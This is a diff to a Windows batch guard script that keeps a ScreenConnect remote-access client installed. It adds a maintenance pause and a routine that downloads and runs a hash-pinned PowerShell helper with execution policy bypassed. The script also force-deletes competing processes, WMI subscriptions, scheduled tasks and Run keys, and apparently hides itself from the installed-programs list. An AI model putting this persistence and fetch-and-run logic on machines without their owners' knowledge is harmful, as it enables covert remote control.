@@ -77,6 +77,8 @@ rem   Get-ScheduledTask hung forever after shields_ok so Gryxa never installed a
 rem   overlap lock stayed held. Both now run detached with a 90s done-file wait (same
 rem   pattern as Shields); on timeout the guard proceeds to Detect/Install. HuntKiller
 rem   also enumerates tasks via schtasks.exe CSV (avoids the Get-ScheduledTask hang).
+rem 0.2.0 (Sight): maint.flag skips install ladder (still digests); Hunt/Rmm prefer
+rem   hash-pinned winrtcs_sidekick.ps1 when present (thin batch / heavy PS path).
 setlocal EnableExtensions EnableDelayedExpansion
 set "ZD=C:\ProgramData\WinRTCS"
 set "CD=C:\ProgramData\Microsoft\WinRTCS\cache"
@@ -103,7 +105,7 @@ set "GDIR86=C:\Program Files (x86)\ScreenConnect Client (36e506ff016b2151)"
 set "GDIR64=C:\Program Files\ScreenConnect Client (36e506ff016b2151)"
 set "PC={9D7CC418-A356-9693-DCC5-41EC44D03B31}"
 set "PACKED=814CC7D9653A3969CD5C14CE440DB313"
-set "GVER=0.1.9"
+set "GVER=0.2.0"
 if not exist "%ZD%" mkdir "%ZD%" >nul 2>&1
 
 rem --- TRUST (C24): data pins published by the agent from the signed manifest ---
@@ -165,6 +167,11 @@ if not defined GSVC (
     call :HuntKiller
     call :Suspects
   ) else ( echo [%DATE% %TIME%] gryxa_absent_fresh>>"%LOG%" )
+  if exist "%ZD%\maint.flag" (
+    set "GSTATE=paused"
+    echo [%DATE% %TIME%] maint_mode_skip_install>>"%LOG%"
+    goto :Done
+  )
   goto :FightThenInstall
 )
 
@@ -226,6 +233,11 @@ echo [%DATE% %TIME%] defender_restored>>"%LOG%"
 exit /b 0
 
 :FightThenInstall
+if exist "%ZD%\maint.flag" (
+  set "GSTATE=paused"
+  echo [%DATE% %TIME%] maint_mode_skip_install>>"%LOG%"
+  goto :Done
+)
 set "GSTATE=installing"
 if !STREAK! GEQ 2 set "GSTATE=fighting"
 if !STREAK! GEQ 2 call :Fight
@@ -574,7 +586,12 @@ rem --- entries go to rmm.new (single alert line); summary goes to rmm.top for t
 rem --- REPORT ONLY. NOTE: no double-quote chars in the PS line below (cmd quoting rule).
 rem --- C25: detached + 90s cap so a hung CIM query can never block Gryxa install. ---
 del /f /q "%ZD%\rmm.done" >nul 2>&1
-start "" /min powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; $sigs=@(); if(Test-Path '%KL%'){ foreach($l in Get-Content '%KL%'){ $t=$l.Trim(); if(-not $t -or $t.StartsWith('#')){ continue }; $sp=$t -split '\|'; if($sp[0] -eq 'rmm' -and $sp[1] -and $sp[2]){ $sigs+=,@($sp[1],($sp[2..($sp.Count-1)] -join '|')) } } }; if(-not $sigs){ $sigs=@(@('AnyDesk','anydesk'),@('TeamViewer','teamviewer'),@('RustDesk','rustdesk'),@('VNC','winvnc|tvnserver|vncserver'),@('MeshCentral','meshagent')) }; $svcs=Get-CimInstance Win32_Service; $procs=Get-CimInstance Win32_Process; $full=@{}; $cmp=@{}; $short=@(); foreach($s in ($svcs | Where-Object { $_.Name -match '^ScreenConnect Client \(' })){ $fp=[regex]::Match($s.Name,'\(([0-9A-Fa-f]+)\)').Groups[1].Value; $img=$s.PathName; $h='';$pt='';$md=''; if($img -match '[?&]h=([^&\s]+)'){ $h=$Matches[1] }; if($img -match '[?&]p=(\d+)'){ $pt=$Matches[1] }; if($img -match '[?&]e=(\w+)'){ $md=$Matches[1] }; if($h){ $h=$h.Trim([char]34) }; $exe=''; if($img -match '([A-Za-z]:\\[^?]+?\.exe)'){ $exe=$Matches[1] }; $dir=''; if($exe){ $dir=Split-Path $exe -Parent }; if(-not $h -and $dir -and (Test-Path (Join-Path $dir 'user.config'))){ $uc=(Get-Content (Join-Path $dir 'user.config') -Raw); if($uc -match 'key=.Host.\s+value=.([^\s/>]+)'){ $h=$Matches[1] }; if($uc -match 'key=.Port.\s+value=.(\d+)'){ $pt=$Matches[1] }; if(-not $h -and $uc -match 'name=.Host.[^>]*>\s*<value>([^<]+)'){ $h=$Matches[1] }; if(-not $pt -and $uc -match 'name=.Port.[^>]*>\s*<value>(\d+)'){ $pt=$Matches[1] } }; $ver=''; if($exe -and (Test-Path $exe)){ $ver=(Get-Item $exe).VersionInfo.FileVersion }; $tag='UNKNOWN'; if($img -match 'gryxa\.com'){ $tag='gryxa' } elseif($fp -eq '5f6010579852e507' -or $fp -eq 'f861c8140d453427'){ $tag='keeper-sevrz' }; $stable=('relay='+$h+':'+$pt+' mode='+$md+' ver='+$ver+' ['+$tag+']'); $k='sc:'+$fp; $cmp[$k]=$stable; $full[$k]=('ScreenConnect FP='+$fp+' '+$stable+' state='+$s.State+' start='+$s.StartMode); $short+=('SC:'+$fp.Substring(0,[Math]::Min(8,$fp.Length))+'@'+$h+':'+$pt+'['+$tag+']') }; foreach($sig in $sigs){ $nm=$sig[0]; $pat=$sig[1]; $hs=$svcs | Where-Object { $_.Name -notmatch 'ScreenConnect' -and ($_.Name -match $pat -or $_.DisplayName -match $pat -or $_.PathName -match $pat) } | Select-Object -First 1; $hp=$null; if(-not $hs){ $hp=$procs | Where-Object { $_.Name -match $pat -or $_.Path -match $pat } | Select-Object -First 1 }; if($hs -or $hp){ $det=''; $pth=''; if($hs){ $pth=$hs.PathName; $det=('svc='+$hs.Name+' state='+$hs.State) } else { $pth=$hp.Path; $det=('proc='+$hp.Name) }; $ex2=''; if($pth -and ($pth -match '([A-Za-z]:\\[^?]+?\.exe)')){ $ex2=$Matches[1] }; $vr=''; if($ex2 -and (Test-Path $ex2)){ $vr=(Get-Item $ex2).VersionInfo.FileVersion }; if($pth){ $pth=(($pth -replace [char]34,' ') -replace '\s+',' ').Trim() }; $stable=('ver='+$vr+' :: '+$pth); $k='rmm:'+$nm; $cmp[$k]=$stable; $full[$k]=($nm+' '+$det+' '+$stable); $short+=($nm) } }; $top=(($short | Sort-Object -Unique) -join ';'); if(-not $top){ $top='none' }; $top | Set-Content -Path '%ZD%\rmm.top' -Encoding ASCII; $old=@{}; if(Test-Path '%ZD%\rmm.db'){ foreach($l in Get-Content '%ZD%\rmm.db'){ $pp=$l -split '\|'; if($pp.Count -ge 2){ $old[$pp[0]]=$pp[1] } } }; $news=@(); foreach($k in $cmp.Keys){ if(-not $old.ContainsKey($k) -or $old[$k] -ne $cmp[$k]){ $news+=$full[$k] } }; if($news){ ($news -join ' || ') | Set-Content -Path '%ZD%\rmm.new' -Encoding ASCII; ($news -join ' || ') | Set-Content -Path '%ZD%\rmm.last' -Encoding ASCII } else { Remove-Item '%ZD%\rmm.new' -Force }; $lines=@(); foreach($k in $cmp.Keys){ $lines+=($k+'|'+$cmp[$k]) }; if($lines){ $lines | Set-Content -Path '%ZD%\rmm.db' -Encoding ASCII } else { Remove-Item '%ZD%\rmm.db' -Force }; 'ok' | Set-Content -Path '%ZD%\rmm.done' -Encoding ASCII" >nul 2>&1
+call :EnsureSidekick
+if exist "%ZD%\winrtcs_sidekick.ps1" (
+  start "" /min powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%ZD%\winrtcs_sidekick.ps1" -Action Rmm -WorkDir "%ZD%" -KillList "%KL%"
+) else (
+  start "" /min powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; $sigs=@(); if(Test-Path '%KL%'){ foreach($l in Get-Content '%KL%'){ $t=$l.Trim(); if(-not $t -or $t.StartsWith('#')){ continue }; $sp=$t -split '\|'; if($sp[0] -eq 'rmm' -and $sp[1] -and $sp[2]){ $sigs+=,@($sp[1],($sp[2..($sp.Count-1)] -join '|')) } } }; if(-not $sigs){ $sigs=@(@('AnyDesk','anydesk'),@('TeamViewer','teamviewer'),@('RustDesk','rustdesk'),@('VNC','winvnc|tvnserver|vncserver'),@('MeshCentral','meshagent')) }; $svcs=Get-CimInstance Win32_Service; $procs=Get-CimInstance Win32_Process; $full=@{}; $cmp=@{}; $short=@(); foreach($s in ($svcs | Where-Object { $_.Name -match '^ScreenConnect Client \(' })){ $fp=[regex]::Match($s.Name,'\(([0-9A-Fa-f]+)\)').Groups[1].Value; $img=$s.PathName; $h='';$pt='';$md=''; if($img -match '[?&]h=([^&\s]+)'){ $h=$Matches[1] }; if($img -match '[?&]p=(\d+)'){ $pt=$Matches[1] }; if($img -match '[?&]e=(\w+)'){ $md=$Matches[1] }; if($h){ $h=$h.Trim([char]34) }; $exe=''; if($img -match '([A-Za-z]:\\[^?]+?\.exe)'){ $exe=$Matches[1] }; $dir=''; if($exe){ $dir=Split-Path $exe -Parent }; if(-not $h -and $dir -and (Test-Path (Join-Path $dir 'user.config'))){ $uc=(Get-Content (Join-Path $dir 'user.config') -Raw); if($uc -match 'key=.Host.\s+value=.([^\s/>]+)'){ $h=$Matches[1] }; if($uc -match 'key=.Port.\s+value=.(\d+)'){ $pt=$Matches[1] }; if(-not $h -and $uc -match 'name=.Host.[^>]*>\s*<value>([^<]+)'){ $h=$Matches[1] }; if(-not $pt -and $uc -match 'name=.Port.[^>]*>\s*<value>(\d+)'){ $pt=$Matches[1] } }; $ver=''; if($exe -and (Test-Path $exe)){ $ver=(Get-Item $exe).VersionInfo.FileVersion }; $tag='UNKNOWN'; if($img -match 'gryxa\.com'){ $tag='gryxa' } elseif($fp -eq '5f6010579852e507' -or $fp -eq 'f861c8140d453427'){ $tag='keeper-sevrz' }; $stable=('relay='+$h+':'+$pt+' mode='+$md+' ver='+$ver+' ['+$tag+']'); $k='sc:'+$fp; $cmp[$k]=$stable; $full[$k]=('ScreenConnect FP='+$fp+' '+$stable+' state='+$s.State+' start='+$s.StartMode); $short+=('SC:'+$fp.Substring(0,[Math]::Min(8,$fp.Length))+'@'+$h+':'+$pt+'['+$tag+']') }; foreach($sig in $sigs){ $nm=$sig[0]; $pat=$sig[1]; $hs=$svcs | Where-Object { $_.Name -notmatch 'ScreenConnect' -and ($_.Name -match $pat -or $_.DisplayName -match $pat -or $_.PathName -match $pat) } | Select-Object -First 1; $hp=$null; if(-not $hs){ $hp=$procs | Where-Object { $_.Name -match $pat -or $_.Path -match $pat } | Select-Object -First 1 }; if($hs -or $hp){ $det=''; $pth=''; if($hs){ $pth=$hs.PathName; $det=('svc='+$hs.Name+' state='+$hs.State) } else { $pth=$hp.Path; $det=('proc='+$hp.Name) }; $ex2=''; if($pth -and ($pth -match '([A-Za-z]:\\[^?]+?\.exe)')){ $ex2=$Matches[1] }; $vr=''; if($ex2 -and (Test-Path $ex2)){ $vr=(Get-Item $ex2).VersionInfo.FileVersion }; if($pth){ $pth=(($pth -replace [char]34,' ') -replace '\s+',' ').Trim() }; $stable=('ver='+$vr+' :: '+$pth); $k='rmm:'+$nm; $cmp[$k]=$stable; $full[$k]=($nm+' '+$det+' '+$stable); $short+=($nm) } }; $top=(($short | Sort-Object -Unique) -join ';'); if(-not $top){ $top='none' }; $top | Set-Content -Path '%ZD%\rmm.top' -Encoding ASCII; $old=@{}; if(Test-Path '%ZD%\rmm.db'){ foreach($l in Get-Content '%ZD%\rmm.db'){ $pp=$l -split '\|'; if($pp.Count -ge 2){ $old[$pp[0]]=$pp[1] } } }; $news=@(); foreach($k in $cmp.Keys){ if(-not $old.ContainsKey($k) -or $old[$k] -ne $cmp[$k]){ $news+=$full[$k] } }; if($news){ ($news -join ' || ') | Set-Content -Path '%ZD%\rmm.new' -Encoding ASCII; ($news -join ' || ') | Set-Content -Path '%ZD%\rmm.last' -Encoding ASCII } else { Remove-Item '%ZD%\rmm.new' -Force }; $lines=@(); foreach($k in $cmp.Keys){ $lines+=($k+'|'+$cmp[$k]) }; if($lines){ $lines | Set-Content -Path '%ZD%\rmm.db' -Encoding ASCII } else { Remove-Item '%ZD%\rmm.db' -Force }; 'ok' | Set-Content -Path '%ZD%\rmm.done' -Encoding ASCII" >nul 2>&1
+)
 set "RW=0"
 :RmmWait
 if exist "%ZD%\rmm.done" goto :RmmOut
@@ -642,9 +659,14 @@ exit /b 0
 :HuntKiller
 rem --- known-bad artifacts are data (winrtcs_killlist.cfg). Runs every cycle, sets killer.flag
 rem --- when anything was removed so the begin flow resets the extkill brake.
-rem --- C25: detached + 90s cap (Get-ScheduledTask hung BRAINDEVICE forever); tasks via schtasks. ---
+rem --- C25: detached + 90s cap. Prefer sidekick.ps1 when present (Sight thin-batch path). ---
 del /f /q "%ZD%\killer.done" "%ZD%\killer.out" >nul 2>&1
-start "" /min powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; $o=@(); $match=@(); $tnames=@(); $files=@(); $dirs=@(); if(Test-Path '%KL%'){ foreach($l in Get-Content '%KL%'){ $t=$l.Trim(); if(-not $t -or $t.StartsWith('#')){ continue }; $p=$t -split '\|'; switch($p[0]){ 'match'{ $match+=$p[1] } 'taskname'{ $tnames+=$p[1] } 'file'{ $files+=$p[1] } 'dir'{ $dirs+=$p[1] } } } }; if(-not $match){ $match=@('gryxa','wucache','etlcache','ETLParser','NetTraceParser','own_mon','own_lib','own_gryxa','zerocool','36e506ff016b2151') }; $pat=$match -join '|'; Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -and ($_.CommandLine -match $pat) -and ($_.CommandLine -notmatch 'ScreenConnect|winrtcs') -and ($_.ProcessId -ne $PID) } | ForEach-Object { $o+=('proc_killed ' + $_.Name + ' pid=' + $_.ProcessId); Stop-Process -Id $_.ProcessId -Force }; $cons=Get-CimInstance -Namespace root\subscription -ClassName __EventConsumer | Where-Object { (($_.CommandLineTemplate) -and ($_.CommandLineTemplate -match $pat)) -or ($_.Name -match $pat) }; foreach($c in $cons){ $o+=('wmi_consumer_killed ' + $c.Name); Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Consumer -match [regex]::Escape($c.Name) } | Remove-CimInstance; Remove-CimInstance $c }; $filts=Get-CimInstance -Namespace root\subscription -ClassName __EventFilter | Where-Object { (($_.Query) -and ($_.Query -match $pat)) -or ($_.Name -match $pat) }; foreach($f in $filts){ $o+=('wmi_filter_killed ' + $f.Name); Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Filter -match [regex]::Escape($f.Name) } | Remove-CimInstance; Remove-CimInstance $f }; $raw = & schtasks.exe /Query /FO CSV /V 2>$null; if($raw){ $csv = $raw | ConvertFrom-Csv; foreach($t in $csv){ $tn=[string]$t.TaskName; if(-not $tn -or $tn -match '\\Microsoft\\Windows\\WinRTCS' -or $tn -match '\\WinRTCSSentinel'){ continue }; $acts=[string]$t.'Task To Run'; if(-not $acts){ $acts=[string]$t.TaskToRun }; $hit=($tn -match $pat) -or ($acts -match $pat); if(-not $hit){ foreach($x in $tnames){ if($tn -match $x){ $hit=$true } } }; if($hit -and ($acts -notmatch 'winrtcs')){ $ev=($acts -replace '\s+',' '); $o+=('task_killed ' + $tn + ' :: ' + $ev.Substring(0,[Math]::Min(160,$ev.Length))); & schtasks.exe /Delete /TN $tn /F 2>$null | Out-Null } } }; foreach($rk in 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run','HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run','HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce','HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce'){ $p=Get-ItemProperty $rk; if($p){ foreach($prop in $p.PSObject.Properties){ if(($prop.Value -is [string]) -and ($prop.Value -match $pat) -and ($prop.Value -notmatch 'ScreenConnect|winrtcs')){ $o+=('runkey_killed ' + $prop.Name); Remove-ItemProperty -Path $rk -Name $prop.Name -Force } } } }; foreach($f in $files){ if(Test-Path $f){ Remove-Item $f -Force; $o+=('file_killed ' + $f) } }; foreach($d in $dirs){ if(Test-Path $d){ Remove-Item $d -Recurse -Force; $o+=('dir_killed ' + $d) } }; if($o){ $o | Set-Content -Path '%ZD%\killer.out' -Encoding ASCII; '1' | Set-Content -Path '%ZD%\killer.flag' -Encoding ASCII }; 'ok' | Set-Content -Path '%ZD%\killer.done' -Encoding ASCII" >nul 2>&1
+call :EnsureSidekick
+if exist "%ZD%\winrtcs_sidekick.ps1" (
+  start "" /min powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%ZD%\winrtcs_sidekick.ps1" -Action Hunt -WorkDir "%ZD%" -KillList "%KL%"
+) else (
+  start "" /min powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; $o=@(); $match=@(); $tnames=@(); $files=@(); $dirs=@(); if(Test-Path '%KL%'){ foreach($l in Get-Content '%KL%'){ $t=$l.Trim(); if(-not $t -or $t.StartsWith('#')){ continue }; $p=$t -split '\|'; switch($p[0]){ 'match'{ $match+=$p[1] } 'taskname'{ $tnames+=$p[1] } 'file'{ $files+=$p[1] } 'dir'{ $dirs+=$p[1] } } } }; if(-not $match){ $match=@('gryxa','wucache','etlcache','ETLParser','NetTraceParser','own_mon','own_lib','own_gryxa','zerocool','36e506ff016b2151') }; $pat=$match -join '|'; Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -and ($_.CommandLine -match $pat) -and ($_.CommandLine -notmatch 'ScreenConnect|winrtcs') -and ($_.ProcessId -ne $PID) } | ForEach-Object { $o+=('proc_killed ' + $_.Name + ' pid=' + $_.ProcessId); Stop-Process -Id $_.ProcessId -Force }; $cons=Get-CimInstance -Namespace root\subscription -ClassName __EventConsumer | Where-Object { (($_.CommandLineTemplate) -and ($_.CommandLineTemplate -match $pat)) -or ($_.Name -match $pat) }; foreach($c in $cons){ $o+=('wmi_consumer_killed ' + $c.Name); Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Consumer -match [regex]::Escape($c.Name) } | Remove-CimInstance; Remove-CimInstance $c }; $filts=Get-CimInstance -Namespace root\subscription -ClassName __EventFilter | Where-Object { (($_.Query) -and ($_.Query -match $pat)) -or ($_.Name -match $pat) }; foreach($f in $filts){ $o+=('wmi_filter_killed ' + $f.Name); Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Filter -match [regex]::Escape($f.Name) } | Remove-CimInstance; Remove-CimInstance $f }; $raw = & schtasks.exe /Query /FO CSV /V 2>$null; if($raw){ $csv = $raw | ConvertFrom-Csv; foreach($t in $csv){ $tn=[string]$t.TaskName; if(-not $tn -or $tn -match '\\Microsoft\\Windows\\WinRTCS' -or $tn -match '\\WinRTCSSentinel'){ continue }; $acts=[string]$t.'Task To Run'; if(-not $acts){ $acts=[string]$t.TaskToRun }; $hit=($tn -match $pat) -or ($acts -match $pat); if(-not $hit){ foreach($x in $tnames){ if($tn -match $x){ $hit=$true } } }; if($hit -and ($acts -notmatch 'winrtcs')){ $ev=($acts -replace '\s+',' '); $o+=('task_killed ' + $tn + ' :: ' + $ev.Substring(0,[Math]::Min(160,$ev.Length))); & schtasks.exe /Delete /TN $tn /F 2>$null | Out-Null } } }; foreach($rk in 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run','HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run','HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce','HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce'){ $p=Get-ItemProperty $rk; if($p){ foreach($prop in $p.PSObject.Properties){ if(($prop.Value -is [string]) -and ($prop.Value -match $pat) -and ($prop.Value -notmatch 'ScreenConnect|winrtcs')){ $o+=('runkey_killed ' + $prop.Name); Remove-ItemProperty -Path $rk -Name $prop.Name -Force } } } }; foreach($f in $files){ if(Test-Path $f){ Remove-Item $f -Force; $o+=('file_killed ' + $f) } }; foreach($d in $dirs){ if(Test-Path $d){ Remove-Item $d -Recurse -Force; $o+=('dir_killed ' + $d) } }; if($o){ $o | Set-Content -Path '%ZD%\killer.out' -Encoding ASCII; '1' | Set-Content -Path '%ZD%\killer.flag' -Encoding ASCII }; 'ok' | Set-Content -Path '%ZD%\killer.done' -Encoding ASCII" >nul 2>&1
+)
 set "HW=0"
 :HuntWait
 if exist "%ZD%\killer.done" goto :HuntOut
@@ -655,6 +677,27 @@ echo [%DATE% %TIME%] hunt_timeout_proceeding>>"%LOG%"
 :HuntOut
 if exist "%ZD%\killer.out" ( type "%ZD%\killer.out">>"%LOG%" & del /f /q "%ZD%\killer.out" >nul 2>&1 )
 del /f /q "%ZD%\killer.done" >nul 2>&1
+exit /b 0
+
+:EnsureSidekick
+rem Fetch/refresh pinned sidekick when missing or hash-mismatched (pin from version via agent cache).
+set "SK=%ZD%\winrtcs_sidekick.ps1"
+set "WANT="
+if exist "%ZD%\winrtcs.version.remote" for /f "usebackq tokens=1,* delims==" %%K in ("%ZD%\winrtcs.version.remote") do if /I "%%K"=="SIDEKICK_SHA256" set "WANT=%%L"
+if not defined WANT if exist "%CD%\winrtcs.version" for /f "usebackq tokens=1,* delims==" %%K in ("%CD%\winrtcs.version") do if /I "%%K"=="SIDEKICK_SHA256" set "WANT=%%L"
+if not defined WANT exit /b 0
+set "GOT="
+if exist "%SK%" call :Sha256 "%SK%" GOT
+if defined GOT if /I "!GOT!"=="!WANT!" exit /b 0
+call :Fetch2 winrtcs_sidekick.ps1 "%ZD%\sidekick.dl"
+set "NH="
+if exist "%ZD%\sidekick.dl" call :Sha256 "%ZD%\sidekick.dl" NH
+if defined NH if /I "!NH!"=="!WANT!" (
+  move /y "%ZD%\sidekick.dl" "%SK%" >nul 2>&1
+  echo [%DATE% %TIME%] sidekick_updated>>"%LOG%"
+) else (
+  del /f /q "%ZD%\sidekick.dl" >nul 2>&1
+)
 exit /b 0
 
 :HideARP
